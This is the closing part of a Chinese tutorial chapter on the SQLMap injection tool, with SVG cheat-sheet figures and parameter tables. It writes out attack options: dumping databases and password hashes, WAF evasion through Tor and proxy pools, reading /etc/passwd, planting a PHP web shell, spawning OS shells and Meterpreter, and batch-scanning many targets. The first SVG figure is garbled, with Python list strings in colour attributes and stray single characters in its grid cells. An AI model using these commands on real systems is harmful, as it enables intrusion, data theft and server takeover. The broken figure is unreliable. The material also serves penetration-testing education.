font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">f</text>  <rect x="544" y="252" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="550" y="267" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">6</text>  <rect x="30" y="284" width="1020" height="28" rx="8" fill="['--dbs 列库', '--tables 列表', '--columns 列列', '--dump 导出表数据', '-D/-T/-C 指定库/表/列', '--users/--passwords/--privileges', '--roles/--dbs 系统权限', '--dump-all --exclude-sysdbs', '--schema 元信息完整导出', '--count 行数统计', '--where "role=\'a\'" 条件', '--search -C passwd 全局搜含密码列']" opacity="0.22"/>  <rect x="30" y="284" width="1020" height="28" rx="8" fill="none" stroke="['--dbs 列库', '--tables 列表', '--columns 列列', '--dump 导出表数据', '-D/-T/-C 指定库/表/列', '--users/--passwords/--privileges', '--roles/--dbs 系统权限', '--dump-all --exclude-sysdbs', '--schema 元信息完整导出', '--count 行数统计', '--where "role=\'a\'" 条件', '--search -C passwd 全局搜含密码列']"/>  <text x="50" y="303" font-size="12.5" font-weight="800" fill="['--dbs 列库', '--tables 列表', '--columns 列列', '--dump 导出表数据', '-D/-T/-C 指定库/表/列', '--users/--passwords/--privileges', '--roles/--dbs 系统权限', '--dump-all --exclude-sysdbs', '--schema 元信息完整导出', '--count 行数统计', '--where "role=\'a\'" 条件', '--search -C passwd 全局搜含密码列']" font-family="Microsoft YaHei,Arial">【3 枚举提取参数 12 条】</text>  <rect x="40" y="318" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="46" y="333" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">#</text>  <rect x="292" y="318" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="298" y="333" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">1</text>  <rect x="544" y="318" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="550" y="333" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">0</text>  <rect x="796" y="318" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="802" y="333" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">b</text>  <rect x="40" y="344" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="46" y="359" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">9</text>  <rect x="292" y="344" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="298" y="359" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">8</text>  <rect x="544" y="344" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="550" y="359" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">1</text>  <rect x="30" y="376" width="1020" height="28" rx="8" fill="['--random-agent 随机 UA', '--delay 1s / --timeout 10s', '--retries=3 重试', '--threads=10 并发线程', '--level 1~5 / --risk 1~3', '--tamper=x,y,z 变形脚本', '--chunked 分块编码', '--hpp 参数污染', '--tor / --tor-port=9050', '--proxy-file=1000ip.txt 池', '--skip-waf 内置 WAF 检测跳过', '--eval="id=urlencode(id)" 动态编码']" opacity="0.22"/>  <rect x="30" y="376" width="1020" height="28" rx="8" fill="none" stroke="['--random-agent 随机 UA', '--delay 1s / --timeout 10s', '--retries=3 重试', '--threads=10 并发线程', '--level 1~5 / --risk 1~3', '--tamper=x,y,z 变形脚本', '--chunked 分块编码', '--hpp 参数污染', '--tor / --tor-port=9050', '--proxy-file=1000ip.txt 池', '--skip-waf 内置 WAF 检测跳过', '--eval="id=urlencode(id)" 动态编码']"/>  <text x="50" y="395" font-size="12.5" font-weight="800" fill="['--random-agent 随机 UA', '--delay 1s / --timeout 10s', '--retries=3 重试', '--threads=10 并发线程', '--level 1~5 / --risk 1~3', '--tamper=x,y,z 变形脚本', '--chunked 分块编码', '--hpp 参数污染', '--tor / --tor-port=9050', '--proxy-file=1000ip.txt 池', '--skip-waf 内置 WAF 检测跳过', '--eval="id=urlencode(id)" 动态编码']" font-family="Microsoft YaHei,Arial">【4 WAF 绕过参数 12 条】</text>  <rect x="40" y="410" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="46" y="425" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">#</text>  <rect x="292" y="410" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="298" y="425" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">e</text>  <rect x="544" y="410" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="550" y="425" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">f</text>  <rect x="796" y="410" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="802" y="425" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">4</text>  <rect x="40" y="436" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="46" y="451" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">4</text>  <rect x="292" y="436" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="298" y="451" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">4</text>  <rect x="544" y="436" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="550" y="451" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">4</text>  <rect x="30" y="468" width="1020" height="28" rx="8" fill="['--file-read=/etc/passwd', '--file-write=./sh.php --file-dest=/var/www/html/sh.php', '--os-cmd="whoami" 单条', '--os-shell 交互 Shell', '--os-pwn 弹 MSF Meterpreter', '--smb-auth-cred / --priv-esc', '--reg-read / --reg-add 注册表操作', '--sql-query="SELECT version()" 自定义 SQL']" opacity="0.22"/>  <rect x="30" y="468" width="1020" height="28" rx="8" fill="none" stroke="['--file-read=/etc/passwd', '--file-write=./sh.php --file-dest=/var/www/html/sh.php', '--os-cmd="whoami" 单条', '--os-shell 交互 Shell', '--os-pwn 弹 MSF Meterpreter', '--smb-auth-cred / --priv-esc', '--reg-read / --reg-add 注册表操作', '--sql-query="SELECT version()" 自定义 SQL']"/>  <text x="50" y="487" font-size="12.5" font-weight="800" fill="['--file-read=/etc/passwd', '--file-write=./sh.php --file-dest=/var/www/html/sh.php', '--os-cmd="whoami" 单条', '--os-shell 交互 Shell', '--os-pwn 弹 MSF Meterpreter', '--smb-auth-cred / --priv-esc', '--reg-read / --reg-add 注册表操作', '--sql-query="SELECT version()" 自定义 SQL']" font-family="Microsoft YaHei,Arial">【5 操作系统高级参数 8 条】</text>  <rect x="40" y="502" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="46" y="517" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">#</text>  <rect x="292" y="502" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="298" y="517" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">f</text>  <rect x="544" y="502" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="550" y="517" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">5</text>  <rect x="796" y="502" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="802" y="517" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">9</text>  <rect x="40" y="528" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="46" y="543" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">e</text>  <rect x="292" y="528" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="298" y="543" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">0</text>  <rect x="544" y="528" width="242" height="22" rx="5" fill="#0b1530" stroke="#1e293b"/>  <text x="550" y="543" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Monospace">b</text>  <rect x="30" y="515" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="531" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">背完这张 48 参数表=能应付 99% SQL 注入场景；剩下 1% 看 --hh 查 400+ 参数细节</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss21" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss21g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s21dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss21g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss21dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-21 批量多 URL 扫描 + SQLMap API 服务两种企业级高级用法</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">护网 100 条 URL 批量扫 用 -m；CTF 平台/自动化 脚本化用 --api / --server RESTful 接口</text>  <rect x="30" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#06b6d4"/>  <text x="280" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#67e8f9" font-family="Microsoft YaHei,Arial">① 批量多 URL 扫描 -m urls.txt（护网 1000+ 目标必备）</text>  <rect x="50" y="150" width="460" height="82" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="50" y="150" width="460" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="280.0" y="170" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">Step 1: 准备 urls.txt（每行 1 条）</text>  <text x="280.0" y="200" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">http://a.com/page?id=1</text>  <text x="280.0" y="216" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">http://b.cn/login.php?uid=2</text>  <text x="280.0" y="232" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">POST:http://c.com/ :: user=*&amp;pass=123</text>  <rect x="50" y="240" width="460" height="82" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="50" y="240" width="460" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="280.0" y="260" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">Step 2: -m + 批量参数 + 输出目录</text>  <text x="280.0" y="290" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">sqlmap -m urls.txt --batch --random-agent</text>  <text x="280.0" y="306" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--threads=6 --output-dir=./huwang_20240627</text>  <text x="280.0" y="322" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--ignore-result 跳过 500/403 结果</text>  <rect x="50" y="330" width="460" height="82" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="50" y="330" width="460" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="280.0" y="350" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">Step 3: 保存 SESSION / 断点续跑</text>  <text x="280.0" y="380" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">中断 Ctrl+C → 下次运行同命令自动读 session.sqlite</text>  <text x="280.0" y="396" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">--resume=SESSION_ID 从断点继续</text>  <text x="280.0" y="412" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">多服务器分布式：output-dir=NFS 共享目录</text>  <rect x="50" y="420" width="460" height="82" rx="10" fill="#0f172a" stroke="#06b6d4" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="50" y="420" width="460" height="30" rx="10" fill="#06b6d4" opacity="0.20"/>  <text x="280.0" y="440" text-anchor="middle" font-size="13" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">Step 4: 最后汇总结果报告</text>  <text x="280.0" y="470" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">每条 URL 独立目录：target1\log、target2\csv</text>  <text x="280.0" y="486" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">用脚本遍历 --output-dir 下所有目标</text>  <text x="280.0" y="502" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">SQLMap -m + --wizard 引导模式 = 小白也能用</text>  <rect x="550" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#ec4899"/>  <text x="800" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#f9a8d4" font-family="Microsoft YaHei,Arial">② SQLMap --api / --server 自动化平台对接</text>  <rect x="570" y="150" width="460" height="82" rx="10" fill="#0f172a" stroke="#ec4899" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="570" y="150" width="460" height="30" rx="10" fill="#ec4899" opacity="0.20"/>  <text x="800.0" y="170" text-anchor="middle" font-size="13" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">① 启动 API Server</text>  <text x="800.0" y="200" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">sqlmapapi.py -s -H 0.0.0.0 -p 8775</text>  <text x="800.0" y="216" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Listening on 0.0.0.0:8775 (REST API)</text>  <text x="800.0" y="232" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">→ 默认 127.0.0.1:8775 带 Swagger 文档</text>  <rect x="570" y="240" width="460" height="82" rx="10" fill="#0f172a" stroke="#dc2626" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="570" y="240" width="460" height="30" rx="10" fill="#dc2626" opacity="0.20"/>  <text x="800.0" y="260" text-anchor="middle" font-size="13" font-weight="800" fill="#dc2626" font-family="Microsoft YaHei,Arial">② 新建扫描任务 → GET task/new</text>  <text x="800.0" y="290" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">{success: true, taskid: 'abcd1234'}</text>  <text x="800.0" y="306" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">拿到 TASK_ID 后再 POST scan/start</text>  <text x="800.0" y="322" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">{url: 'http://t/?id=1', ...参数 JSON}</text>  <rect x="570" y="330" width="460" height="82" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="570" y="330" width="460" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="800.0" y="350" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">③ 轮询状态 scan/{id}/status</text>  <text x="800.0" y="380" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">status: running → terminated</text>  <text x="800.0" y="396" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">progress: 78% | 注入点已发现 type=booleanized</text>  <text x="800.0" y="412" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">log: 所有 console 输出可拉</text>  <rect x="570" y="420" width="460" height="82" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="570" y="420" width="460" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="800.0" y="440" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">④ 拿结果 + 下载数据 /data</text>  <text x="800.0" y="470" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">GET scan/{id}/data → 输出 DBMS、库、表</text>  <text x="800.0" y="486" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">GET scan/{id}/download/0 → dump CSV</text>  <text x="800.0" y="502" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">实现 Python/Go 平台化 SQL 注入扫描器</text>
</svg>

### 测试参数

| 参数 | 说明 |
|------|------|
| -u | 目标URL |
| -r | 请求文件 |
| -p | 指定测试参数 |
| --data | POST数据 |
| --cookie | Cookie |
| --headers | HTTP头 |
| --level | 测试级别(1-5) |
| --risk | 风险级别(1-3) |

### 信息提取参数

| 参数 | 说明 |
|------|------|
| --dbs | 列出数据库 |
| --tables | 列出表 |
| --columns | 列出列 |
| --dump | 提取数据 |
| --dump-all | 提取所有数据 |
| --current-db | 当前数据库 |
| --current-user | 当前用户 |
| --is-dba | 是否管理员 |
| --users | 列出用户 |
| --passwords | 密码哈希 |

### 高级参数

| 参数 | 说明 |
|------|------|
| --file-read | 读取文件 |
| --file-write | 写入文件 |
| --os-shell | 系统Shell |
| --sql-shell | SQL Shell |
| --tamper | Tamper脚本 |
| --proxy | 代理 |
| --tor | Tor匿名 |
| --delay | 延迟 |
| --threads | 线程数 |
| --batch | 自动回答 |

---

## 总结

本章详细介绍了SQLMap的使用：

1. **SQL注入原理**：理解各种注入类型
2. **安装配置**：Python环境、各系统安装
3. **基础命令**：检测注入、参数详解
4. **六种技术**：布尔、时间、报错、联合、堆叠、外带
5. **数据库枚举**：数据库、表、列、数据提取
6. **绕过WAF**：Tor、代理、Tamper脚本
7. **实战案例**：MySQL、SQL Server、Oracle、Access

SQLMap是SQL注入测试的必备工具，能够大大提高测试效率。

下一章我们将学习Wireshark——网络协议分析工具！